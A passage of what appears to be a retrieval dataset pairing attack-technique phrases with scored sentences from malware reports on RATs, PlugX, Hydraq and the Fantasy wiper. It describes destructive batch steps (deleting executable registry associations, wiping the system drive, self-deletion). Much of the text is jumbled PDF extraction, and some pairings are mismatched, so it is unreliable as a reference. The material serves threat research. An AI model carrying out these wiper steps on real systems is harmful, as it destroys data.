PowerShell CommandExecutionResultExecuted but command with for Command: is: Failed to PowerPlus module CmdExec command +Command : : Executed Upload Result (pwls.dll).', 'The result of and Result Sent or Command : the command will be in Successfully : Failed to be C:\\\\Users\\\\Public\\\\Exec.', 'Executed Plugins The payload runs several plugins: first it downloads them, then writes to their respective filenames, and finally executes.', 'At the time of our analysis, some of the modules were no longer available for download.', 'Screen Capture The screen capture plugin is called sc.exe and is downloaded from the C&C server.', 'It is a compiled .NET open- source project named https://github.com/bencevans/screenshot-desktop.', 'The module supports the following arguments (can be seen using the flag /h or /help) Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter <filename> captures the screen or the active window and saves it to a file.', 'Usage: filename [WindowTitle] filename - the file where the screen capture will be saved allowed file extensions are - Bmp,Emf,Exif,Gif,Icon,Jpeg,Png,Tiff,Wmf.', 'WindowTitle - instead of capture whole screen you can point to a window with a title which will put on focus and captuted.', 'For WindowTitle you can pass only the first few characters.']"
screen capture|0.7662544960977556|"['Access Command and T1032 Standard Cryptographic Protocol The RAT uses SSL for encrypting C2 communications.', 'Control T1043 Commonly Used Port The RAT uses port 443. https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 6/75/15/2020 Mikroceen: Spying backdoor leveraged in high-profile networks in Central Asia | WeLiveSecurity Tactic ID Name Description T1071 Standard Application Layer The RAT uses the Schannel implementation of SSL.', 'Protocol T1001 Data Obfuscation The RATs interface controls the client with obfuscated commands.', 'T1030 Proxy Connection The RAT has a proxy option that masks traffic between the malware and the remote operators.', 'Exfiltration T1041 Exfiltration Over Command and The operator of the RAT can download any desired file from a victim.', 'Control Channel Collection T1113 Screen Capture The RAT can capture the victims screen.', 'Peter Klnai 14 May 2020 - 02:00PM https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 7/7']"
screen capture|1.0|"[""TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT."", 'TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger\'\' detailing TigerRAT and its downloader ""TigerDownloader.""', 'This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""']"
used various RATs that can capture screenshots of victim machines|0.8015862638659319|['T1091 Replication Through The attackers have used njRAT, which can be configured to spread Removable Media via removable drives.', 'Collection T1123 Audio Capture The attackers have used various RATs that can capture audio from the systems microphone.', 'T1115 Clipboard Data The attackers have used various RATs that can access and modify data from the clipboard.', 'T1005 Data from Local System The attackers have used various RATs that can access the local file system and upload, download or delete files.', 'T1056.001 Input Capture: Keylogging The attackers have used various RATs that have keylogging capabilities.', 'T1113 Screen Capture The attackers have used various RATs that can capture screenshots of victim machines.', 'T1125 Video Capture The attackers have used various RATs that can access the victims webcam.', 'Command T1132.001 Data Encoding: Standard The attackers have used njRAT, which uses base64 encoding for and Control Encoding C&C traffic.', 'T1573.001 Encrypted Channel: The attackers have used Remcos RAT, which uses RC4 for Symmetric Cryptography encrypting C&C communications.', 'T1095 Non-Application Layer The attackers have used various RATs that use TCP for C&C Protocol communications.', 'T1571 Non-Standard Port The attackers have used various RATs that communicate over different port numbers.']
exfiltration of files|0.8544024310674732|['ESET Research white papers TLP: WHITE JUMPING THE AIR GAP: 15 years of nation-state effort Authors: Alexis Dorais-Joncas Facundo Munz December 20212 JUMPING THE AIR GAP: 15 years of nation-state effort TLP: WHITE TABLE OF CONTENTS 1.', 'Executive summary .', '.', '.', '.', '.', '.', '.']
exfiltration of files|0.7991341765551742|['Educate users that will make that more difficult).', 'Look for unusual if their phone suddenly loses service, they should process trees.', '(A good endpoint protection treat that as a potential security problem as well tool should catch this itself, but you should as an availability problem.', 'Require that devices still ensure youre running down investigative being used for corporate authentication (even leads from time to time rather than just closing personally owned devices) be locked with a PIN everything as a false positive to keep the metrics against port-out and SIM changes in the mobile good.)', 'And try to alert on unusual storage usage, carriers systems.', 'to catch staging for exfiltration.', 'Watch account creation and reactivation.', 'Alert on new account creation that doesnt quite fit naming conventions.', 'Alert and escalate on old or intentionally disabled privileged accounts being reactivated.', '13Spotlight On: Muddled Libra Incident Response Report 2024 Know Your Applications Summarizing the If you see red-teaming tools in your environment, make sure there is an Adversary authorized red-team engagement underway.', 'One SOC we worked with had a company logo sticker on the wall for each red team theyd caught.']
used various RATs that exfiltrate data over the same channel used for C&C|0.7550779249524412|['T1125 Video Capture The attackers have used various RATs that can access the victims webcam.', 'Command T1132.001 Data Encoding: Standard The attackers have used njRAT, which uses base64 encoding for and Control Encoding C&C traffic.', 'T1573.001 Encrypted Channel: The attackers have used Remcos RAT, which uses RC4 for Symmetric Cryptography encrypting C&C communications.', 'T1095 Non-Application Layer The attackers have used various RATs that use TCP for C&C Protocol communications.', 'T1571 Non-Standard Port The attackers have used various RATs that communicate over different port numbers.', 'Exfiltration T1041 Exfiltration Over C2 Channel The attackers have used various RATs that exfiltrate data over the same channel used for C&C.', '12 Jan 2021 - 11:30AM 15/15']
used various RATs that can browse file systems|0.7576702371785186|['Packing T1027.003 Obfuscated Files or The attackers have used packers that read pixel data from images Information: Steganography contained in PE files resource sections and build the next layer of execution from the data.', 'T1055.002 Process Injection: Portable The attackers have used droppers that inject the payload into Executable Injection legitimate processes such as RegAsm.exe, MSBuild.exe and more.', 'T1497.001 Virtualization/Sandbox The attackers have used droppers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tools.', 'Credential T1555.003 Credentials from Password The attackers have used various RATs with modules that steal Access Stores: Credentials from passwords saved in victim web browsers.', 'Web Browsers 14/15Tactic ID Name Description Discovery T1010 Application Window The attackers have used droppers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The attackers have used various RATs that can browse file systems.', 'T1120 Peripheral Device Discovery The attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection.', 'T1057 Process Discovery The attackers have used various RATs with modules that show running processes.', 'T1012 Query Registry The attackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The attackers have used njRAT, which can identify remote hosts on connected networks.', 'T1518.001 Software Discovery: Security The attackers have used droppers that check for security software Software Discovery present in a victims computer.']
used various RATs with modules that show running processes|0.765345942696176|['T1497.001 Virtualization/Sandbox The attackers have used droppers and payloads that perform anti- Evasion: System Checks analysis checks to detect virtual environments and analysis tools.', 'Credential T1555.003 Credentials from Password The attackers have used various RATs with modules that steal Access Stores: Credentials from passwords saved in victim web browsers.', 'Web Browsers 14/15Tactic ID Name Description Discovery T1010 Application Window The attackers have used droppers and RATs that gather information Discovery about opened windows.', 'T1083 File and Directory Discovery The attackers have used various RATs that can browse file systems.', 'T1120 Peripheral Device Discovery The attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection.', 'T1057 Process Discovery The attackers have used various RATs with modules that show running processes.', 'T1012 Query Registry The attackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The attackers have used njRAT, which can identify remote hosts on connected networks.', 'T1518.001 Software Discovery: Security The attackers have used droppers that check for security software Software Discovery present in a victims computer.', 'T1082 System Information The attackers have used various RATs that gather system information Discovery such as computer name and operating system during the initial infection.', 'T1016 System Network The attackers have used various RATs that can collect the IP address Configuration Discovery of the victim machine.']
used various RATs that gather system information such as computer name and operating system during the initial infection|0.8703678647019362|['T1120 Peripheral Device Discovery The attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection.', 'T1057 Process Discovery The attackers have used various RATs with modules that show running processes.', 'T1012 Query Registry The attackers have used various RATs that can read the Registry.', 'T1018 Remote System Discovery The attackers have used njRAT, which can identify remote hosts on connected networks.', 'T1518.001 Software Discovery: Security The attackers have used droppers that check for security software Software Discovery present in a victims computer.', 'T1082 System Information The attackers have used various RATs that gather system information Discovery such as computer name and operating system during the initial infection.', 'T1016 System Network The attackers have used various RATs that can collect the IP address Configuration Discovery of the victim machine.', 'T1049 System Network The attackers have used various RATs that can list network Connections Discovery connections on a victims computer.', 'T1033 System Owner/User The attackers have used various RATs that retrieve the current Discovery username during initial infection.', 'T1007 System Service Discovery The attackers have used various RATs that have modules to manage services on the system.', 'T1021.001 Remote Services: Remote The attackers have used various RATs that can perform remote Desktop Protocol desktop access.']
used various RATs that can perform remote desktop access.|0.7620120238653512|['T1082 System Information The attackers have used various RATs that gather system information Discovery such as computer name and operating system during the initial infection.', 'T1016 System Network The attackers have used various RATs that can collect the IP address Configuration Discovery of the victim machine.', 'T1049 System Network The attackers have used various RATs that can list network Connections Discovery connections on a victims computer.', 'T1033 System Owner/User The attackers have used various RATs that retrieve the current Discovery username during initial infection.', 'T1007 System Service Discovery The attackers have used various RATs that have modules to manage services on the system.', 'T1021.001 Remote Services: Remote The attackers have used various RATs that can perform remote Desktop Protocol desktop access.', 'T1091 Replication Through The attackers have used njRAT, which can be configured to spread Removable Media via removable drives.', 'Collection T1123 Audio Capture The attackers have used various RATs that can capture audio from the systems microphone.', 'T1115 Clipboard Data The attackers have used various RATs that can access and modify data from the clipboard.', 'T1005 Data from Local System The attackers have used various RATs that can access the local file system and upload, download or delete files.', 'T1056.001 Input Capture: Keylogging The attackers have used various RATs that have keylogging capabilities.']
used various RATs that can access the local file system and upload, download or delete files|0.8388794989247406|['T1007 System Service Discovery The attackers have used various RATs that have modules to manage services on the system.', 'T1021.001 Remote Services: Remote The attackers have used various RATs that can perform remote Desktop Protocol desktop access.', 'T1091 Replication Through The attackers have used njRAT, which can be configured to spread Removable Media via removable drives.', 'Collection T1123 Audio Capture The attackers have used various RATs that can capture audio from the systems microphone.', 'T1115 Clipboard Data The attackers have used various RATs that can access and modify data from the clipboard.', 'T1005 Data from Local System The attackers have used various RATs that can access the local file system and upload, download or delete files.', 'T1056.001 Input Capture: Keylogging The attackers have used various RATs that have keylogging capabilities.', 'T1113 Screen Capture The attackers have used various RATs that can capture screenshots of victim machines.', 'T1125 Video Capture The attackers have used various RATs that can access the victims webcam.', 'Command T1132.001 Data Encoding: Standard The attackers have used njRAT, which uses base64 encoding for and Control Encoding C&C traffic.', 'T1573.001 Encrypted Channel: The attackers have used Remcos RAT, which uses RC4 for Symmetric Cryptography encrypting C&C communications.']
data exfiltration of sensitive information|0.9308387836783993|['It checks the service name it is running on.', 'It performs a case sensitive comparison on the first three characters of the service name Ras.', 'If it is not the same, it stops the service operation and deletes the current service.', 'It then registers a new service name in the following format: RaS<random 4 characters> This behavior suggests that Win32/Hydraq DLL changes its service name every time an infected system is rebooted, or the service is restarted.', 'The malware will never have a service name starting with Ras due to the fact that it generates a service name starting with RaS (Take note of the case sensitive comparison).', '2.', 'The DLL component creates a service with the following characteristics: ErrorControl: SERVICE_ERROR_IGNORE Start: SERVICE_AUTO_START Type: SERVICE_WIN32_SHARE_PROCESS ImagePath: %SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs 3.', 'Similar to the Win32/Hydraq dropper, the DLL component takes advantage of the available privileges running under the context of trusted Windows system processes.', 'It adds the fol- lowing registry entry as a parameter to the newly created service.', 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\RaS<4 random char- acters>\\\\Parameters\\\\ServiceDll = %system%\\\\Rasmon.dll 4.', 'In addition, the DLL component also adds an entry of its service name in the following reg- istry entry below.']
runs a scheduled task|0.7969531831547649|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
keyloggers|0.8233806211138265|"['observed in the wild since 2012.', 'SideCopys usage of ReverseRAT: Another previously undiscovered C#- Epicenter dates back to as early as 2018 - 19.', '2021 Cisco.', 'All rights reserved.', 'talos-external@cisco.com | talosintelligence.com page 8 of 23InSideCopy: How this APT continues to evolve its arsenal PLUGINS In addition to full-fledged RATs, SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint: File manager: A file management component that can enumerate, download and upload files on the endpoint from/to the C2.', 'Keyloggers: There are two keyloggers used by Side- Copy.', 'Xeytan: A publicly available C#-based keylogger available since 2016.', 'Lavao: Another C#-based keylogger.', 'Browser credential stealers: Again, there are two types of stealers used: C-based stealer component to steal passwords from Firefox and Chrome.', 'C#-based stealer component to steal Chromium browser passwords.', 'Nodachi: A previously unknown set of plugins uti- lized by SideCopy were calling Nodachi.']"
It contains Base64-encoded data|0.7967993755355051|['ESET Research White Paper // May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Matthieu FaouTABLE OF CONTENTS 1.', 'Executive Summary .', '.', '.', '.', '.', '.', '.']
Exploit Public-Facing Applications|0.7794700440957882|['1 MITRE.', '(October 11, 2019).', 'Drive-by Compromise.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1189/ 2 MITRE.', '(October 22, 2019).', 'Exploit Public-Facing Application.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1190/ 3 MITRE.', '(May 31, 2017).', 'External Remote Services.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1133/ TLP: WHITE, ID#202006091030 10TTPs Hardware Additions 1 Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access.', 'While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access.']
the UPX packed sample|0.8346239988280229|"['helps you detect malware on servers and workstations.', 'Taking adequate measures timely will minimize the damage and prevent the serious consequences of targeted attacks.8 8 Operating Routine of Discovered Malware Samples BackDoor.PlugX.93 Added to the Dr.Web virus database: 2021-10-22 Virus description added: 2021-10-30 Packer: absent Compilation date: 2020-08-13 SHA1 hash: a8bff99e1ea76d3de660ffdbd78ad04f81a8c659 Description The PlugX backdoor module is written in C. Its designed to decrypt the shellcode from the registry that loads the main backdoor into memory.', 'Operating principle First, the backdoor receives the address of the VirtualProtect() function by hash.', ""It then uses this address to change access rights to PAGE_EXECUTE_READWRITE, starting from the function at 0x10001000 and ending with the entire .text section: Getting the functions address by the hash passed as a parameter:9 9 Script to get a function by hash: import pefile ror = lambda val, r_bits, max_bits: \\\\10 10 ((val & (2**max_bits-1)) >> r_bits%max_bits) | \\\\ (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1)) max_bits = 32 library_path_list = [...] # absolute path dlls def get_func_addr(hash): for library_path in library_path_list: library = library_path.split('\\\\\\\\') name_dll = library[len(library) - 1].upper() + b'\\\\x00' hash_name_dll = 0 for i in name_dll: hash_name_dll = ord(i) + ror(hash_name_dll, 0x0D, max_bits) hash_name_dll = 0 + ror(hash_name_dll, 0x0D, max_bits) pe = pefile.PE(library_path) for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: func_name = exp.name + b'\\\\x00' hash_name_func = 0 for i in func_name: hash_name_func = ord(i) + ror(hash_name_func, 0x0D, max_bits) if (hash_name_dll + hash_name_func == hash): print '{}-> 0x{:08x} -> {}'.format(name_dll, hash, exp.name) return Changing the permissions to PAGE_EXECUTE_READWRITE was necessary to decrypt the code using the XOR operation:11 11 One version of the backdoor has dynamic XOR encryption."", 'It has decryption at the beginning of the function: And with encryption at the end of the function:12 12 Facilitating the scripts work for IDAPython: import idaapi def xor_dec(address, count, key): for i in xrange(count): idaapi.patch_dword(address, idaapi.get_dword(address) ^ key) key += idaapi.get_dword(address) address += 4 Before performing malicious actions, the backdoor, as in the case of VirtualProtect(), receives functions addresses that it needs to work13 13 Received features: Function name Hash CloseHandle 0x528796C6 CreateFileA 0x4FDAF6DA DeleteFileA 0x13DD2ED7 ExitProcess 0x56A2B5F0 GetAdaptersInfo 0x62C9E1BD GetModuleFileNameA 0xFE61445D GetSystemDirectoryA 0x60BCDE05 LoadLibraryA 0x726774C ReadFile 0xBB5F9EAD14 14 Function name Hash RegCloseKey 0x81C2AC44 RegDeleteValueA 0x3846A3A8 RegEnumValueA 0x2EC95AA4 RegOpenKeyExA 0x3E9E3F88 RegQueryValueExA 0x8FF0E305 VirtualAlloc 0xE553A458 VirtualFree 0x300F2F0B VirtualProtect 0xC38AE110 WinExec 0x876F8B31 WriteFile 0x5BAE572D In addition, the backdoor checks if it is executed in a sandbox:15 15 After receiving the function addresses and checking for execution in the sandbox, BackDoor.PlugX.93 removes the updatecfgSetup task from the task scheduler: The key for shellcode encryption is MD5 from the following registry key values:16 16 HKLM\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\InstallDate HKLM\\\\System\\\\ControlSet001\\\\Control\\\\ComputerName\\\\ComputerName The shellcode is stored in the following registry keys: HKLM\\\\Software\\\\BINARY HKCU\\\\Software\\\\BINARY17 17 Before running the shellcode, itll be decrypted in 2 steps: first, using the RC4 algorithm: then, with XOR:18 18 BackDoor.Siggen2.3622 Added to the Dr.Web virus database: 2021-11-03 Virus description added: 2021-xx-xx Packer: UPX SHA1 hash: be4d8344669f73e9620b9060fd87bc519a05617a Description A backdoor written in Go.', 'Its packed by UPX.', 'Investigated backdoor version V2.5.5 z 2021.7.19.', 'Operating principle In the beginning, the malicious code checks if another backdoor copy is running.', 'The trojan checks for the c:\\\\windows\\\\inf\\\\mdmslbv.inf file.', 'If it exists, the trojan starts reading.', ""You can use the following script to decrypt: import sys with open(sys.argv[1], 'rb') as f: d = f.read() s = bytearray() for i in range(len(d)): s.append(d[i]) for i in range(len(s)-2, 0, -1): s[i] = (((s[i + 1] * s[i + 1]) ^ s[i]) & 0xff) with open(sys.argv[1] + '.dec', 'wb') as f: f.write(s) Encrypted files length The packets structure:19 19 random string from 10 to 19 characters long between the <a>...</a> tags contains the backdoor processs PID between the <b>...</b> tags is the processs name random string from 10 to 19 characters long The trojan checks for the existence of a process with the specified parameters.""]"
operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.|0.8143074534237495|['Sandals lateral moveme B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274spchost.exe MSIL/Agent.XH Fantasy spreader.', 'MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework.', 'Tactic ID Name Description Agrius builds utility tools to use during an active exploitation T1587 Develop Capabilities Resource process.', 'Development Develop Capabilities: Agrius builds custom malware including wipers (Fantasy) T1587.001 Malware and lateral movement tools (Sandals).', 'Valid Accounts: Agrius operators attempted to capture cached credentials T1078.002 Domain Accounts and then use them for lateral movement.', 'Initial Access Agrius operators attempted to use cached credentials from Valid Accounts: Local T1078.003 local accounts to gain initial access to additional systems Accounts within an internal network.', 'Command and Scripting Interpreter: Fantasy and Sandals both use batch files that run via the Execution T1059.003 Windows Command Windows command shell.', 'Shell 8/10Tactic ID Name Description Fantasy uses the LookupPrivilegeValue and Privilege Access Token AdjustTokenPrivilege APIs in advapi32.dll to grant its T1134 Escalation Manipulation process token the SeShutdownPrivilege to reboot Windows.', 'Defense Indicator Removal on Agrius operators timestomped the compilation timestamps T1070.006 Evasion Host: Timestomp of Fantasy and Sandals.', 'Credential OS Credential Agrius operators used several tools to dump OS credentials T1003 Access Dumping for use in lateral movement.', 'Network Share Agrius operators used cached credentials to check for Discovery T1135 Discovery access to other systems within an internal network.']
a batch file|0.7627503885238869|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
creates another batch file, system.bat,|0.7645585191673456|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
lists the command line arguments accepted|0.7626013645063451|['-s Run the remote process in the SYSTEM account.', 'Sandals does not write the Fantasy wiper to remote systems.', 'We believe that the Fantasy wiper is deployed via a supply-chain attack using the software developers software update mechanism.', 'This assessment is based on several factors: all victims were customers of the affected software developer; the Fantasy wiper was named in a similar fashion to legitimate versions of the software; all victims executed the Fantasy wiper within a 2.5 hour timeframe, where victims in South Africa were targeted first, then victims in Israel, and finally victims in Hong Kong (we attribute the delay in targeting to time zone differences and a hardcoded check-in time within the legitimate software); and, 2/10lastly, the Fantasy wiper was written to, and executed from, %SYSTEM%\\\\Windows\\\\Temp, the default temp directory for Windows systems.', 'Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims machines, and for ease of batch file execution.', 'Table 1 lists the command line arguments accepted by Sandals.', 'Table 1.', 'Sandals arguments and their descriptions Argument Description Required A path and filename to a file that contains a list of hostnames that should be -f <filepath> Yes targeted.', 'The username that will be used to log into the remote hostname(s) in argument -u <username> Yes -f. The username that will be used to log into the remote hostname(s) in argument -p <password> Yes -f. The path and filename of the Fantasy wiper on the remote system that will be -l <filepath> Yes executed by the batch file created by Sandals.', 'The location to which Sandals will write the batch file on the remote system.', '-d <path> No Default location is %WINDOWS%\\\\Temp.']
then deletes the file.|0.7670009562791037|"['stdout and stderr are redirected to a string and the content of the string will be sent to the C&C.', 'If the file to be executed does not exists it sends back to the C&C 0011|||file 2|||url|||file Downloads the file from url and writes it with the name file.', 'Returns to the C&C 0020|||file if the file was successfuly written, 0021|||file if the file was not written or 0051|||url|||errCode if the download failed.', '3|||file Searches the file file and sends it to the C&C.', 'In case of an error it will return 0034|||file if the file is a folder, 0033|||file|||size if the file size is greater than 5000000 bytes, 0031|||file if the file exists but it couldnt get information about it, 0032|||file if the file does not exists, 0051|||url|||errCode if the file could not be sent due to some network problems.', '4|||file Deletes the file file.', 'Returns to the C&C 0040|||file if the file was deleted or 0041|||file if the file could not be deleted.', '5|||string1|||file Sends back string1 to the C&C.', 'The C&C responds with a buffer which will be written to the file file.', 'It sends back to the C&C 0020|||file if the file was successfuly written, 0021|||file if the file could not be written or 0051|||url|||errCode in case of network problems.', '6|||path|||depth Lists files and directories from path recursively until depth level, then it sends the list to the C&C.']"
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.|1.0|['However, the Fantasy wiper only looks for an argument of 411 and ignores all other runtime input (see the next section for more information).', 'Fantasy wiper 3/10The Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames: fantasy45.exe and fantasy35.exe, respectively.', 'Figure 3 depicts the execution flow of the Fantasy wiper.', '4/10Figure 3.', 'Fantasy wiper execution flow Initially, Fantasy creates a mutex to ensure that only one instance is running.', 'It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.', 'Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.GetBytes method to create a cryptographically strong sequence of random values in a 4096-byte array.', 'If a runtime argument of 411 is supplied to the wiper, the for loop overwrites the contents of every file with the aforementioned byte array using a nested while loop.', 'Otherwise, the for loop only overwrites files with a file extension listed in the Appendix.', 'Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.', 'This is presumably done to make recovery and forensic analysis more difficult.']
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.|1.0|['An example of a Sandals batch file is shown in Figure 2.Figure 2.', 'Sandals batch file (top, in red) and the decoded command line parameter (bottom, in blue)The base64 string that followsfantasy35.exeis likely a relic of the execution requirements of Apostle (more details in theAttribution to Agriussection).', 'However, the Fantasy wiper only looks for an argument of411and ignores all other runtime input (see the next section for more information).Fantasy wiperThe Fantasy wiper is also a 32-bit Windows executable written in C#/.NET, so named for its filenames:fantasy45.exeandfantasy35.exe, respectively.', 'Figure 3 depicts the execution flow of the Fantasy wiper.Figure 3.', 'Fantasy wiper execution flowInitially, Fantasy creates a mutex to ensure that only one instance is running.', 'It collects a list of fixed drives but excludes the drive where the%WINDOWS%directory exists.', 'Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses theRNGCryptoServiceProvider.GetBytesmethod to createa cryptographically strong sequence of random valuesin a 4096-byte array.', 'If a runtime argument of411is supplied to the wiper, theforloop overwrites the contents of every file with the aforementioned byte array using a nestedwhileloop.', 'Otherwise, theforloop only overwrites files with a file extension listed in the Appendix.Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties:CreationTimeLastAccessTimeLastWriteTimeCreationTimeUtcSetLastAccessTimeUtcLastWriteTimeUtcand then deletes the file.', 'This is presumably done to make recovery and forensic analysis more difficult.During theforloop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files.', 'If the number of errors exceeds 50, it writes a batch file,%WINDOWS%\\\\Temp\\\\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.']
Recursive directory listing functions|0.7587236657674971|['Decompression After decryption, the payload is decompressed recursively using GZip.', 'Once the Command and Forward variables are extracted, they are used by the malware to launch the requested built-in functionality.', 'The first byte of the Command parameter (Command ID) is used to determine which built-in function will be executed by the malware.', 'In most cases, the Forward data will contain the arguments for the requested function, but in some cases, the selected functionality will not require both variables and only the Command variable is resolved.', 'The built-in functionalities of the NodeIISWeb malware can be seen in the following table: Command ID Description 0x00 Information gathering - Query domain membership, operation system information, process and owner information of the current process, time zone, network interfaces information and status and drives information.', '0x01 Recursive directory listing.', '0x02 File reading.', '0x03 File writing.', '0x04 Copying or moving files, or recursively copying directories.', '0x05 files and recursive directories deletion.', '0x06 Directory creation.']
that deletes the Fantasy wiper from disk and then deletes itself.|0.7863761595532537|['File wiping then resumes in the next directory in the target list.', 'Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\\\\Temp called registry.bat.', 'The batch file deletes the following registry keys: HKCR\\\\.EXE HKCR\\\\.dll HKCR\\\\* Then it runs the following to attempt to clear file system cache memory: %windir%\\\\system32\\\\rundll32.exe advapi32.dll,ProcessIdleTasks Lastly, registry.bat deletes itself (del %0).', 'Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\\\\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.', 'Then Fantasy sleeps for two minutes before overwriting the systems Master Boot Record.', 'Fantasy then writes another batch file, %WINDOWS%\\\\Temp\\\\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.', 'Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) Other issue.', 'It is likely that %SYSTEMDRIVE% recovery is possible.', 'Victims were observed to be back up and running within a matter of hours.', 'Attribution to Agrius Much of the code base from Apostle, initially a wiper masquerading as ransomware then updated to actual ransomware, was directly copied to Fantasy and many other functions in Fantasy were only slightly modified from Apostle, a known Agrius tool.', 'However, the overall functionality of Fantasy is that of a wiper without any attempt to masquerade as ransomware.']
"deletes the following registry keys:
HKCR\.EXE
HKCR\.dll
